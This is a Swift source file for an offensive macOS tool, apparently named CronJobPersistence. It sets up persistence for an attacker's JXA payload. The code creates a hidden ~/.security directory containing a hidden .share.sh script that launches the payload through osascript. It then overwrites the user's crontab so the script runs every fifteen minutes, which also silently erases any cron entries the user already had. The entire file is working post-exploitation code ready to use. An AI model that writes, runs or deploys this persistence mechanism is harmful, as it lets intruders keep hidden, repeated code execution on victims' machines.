import Foundation
import Cocoa

//Usage: ./CronJobPersistence [path_to_js_jxa_payload]

let uname = NSUserName()
let home = "/Users/\(uname)"
var output = ""
let fileMan = FileManager.default
var isDir = ObjCBool(false)
let name = CommandLine.arguments[0]

if CommandLine.arguments.count == 2{
    
    var payload = CommandLine.arguments[1]
    if fileMan.fileExists(atPath: payload, isDirectory: &isDir){
        
        do {
            var cronFilePath = "\(home)/.security"
            var scriptPath = "\(home)/.security/.share.sh"
            
            if !(fileMan.fileExists(atPath: cronFilePath, isDirectory: &isDir)){
                try fileMan.createDirectory(atPath: cronFilePath, withIntermediateDirectories: false, attributes: nil)
                    
                    var runme =
                        """
                #!/bin/bash
                #--------downloader----------#
                osascript \(payload) &
                """
                    
                try runme.write(to: URL(fileURLWithPath: scriptPath), atomically: false, encoding: .utf8)
                
                var attributes = [FileAttributeKey : Any]()
                attributes[.posixPermissions] = 0o755
                try fileMan.setAttributes(attributes, ofItemAtPath: scriptPath)
                
            }
            

            let task = Process()
            task.launchPath = "/bin/sh"
            task.arguments = ["-c", ##"echo "$(echo '*/15 * * * * cd $HOME/.security/ && ./.share.sh')" | crontab -"##]
            let pipe = Pipe()
            task.standardOutput = pipe
            
            task.launch()
            
            let results = pipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data:results, encoding: .utf8)!
            print(output)
            print("CronJob persistence installed at \(cronFilePath)")
        }
        catch let error {
            print(error)
        }
        
    }
    else {
        print("[-] Payload file not found. Exiting...")
        exit(0)
    }
    
}
else {
    print("Usage: \(name) [path_to_js_jxa_payload]")
    print("Exiting...")
    exit(0)
}
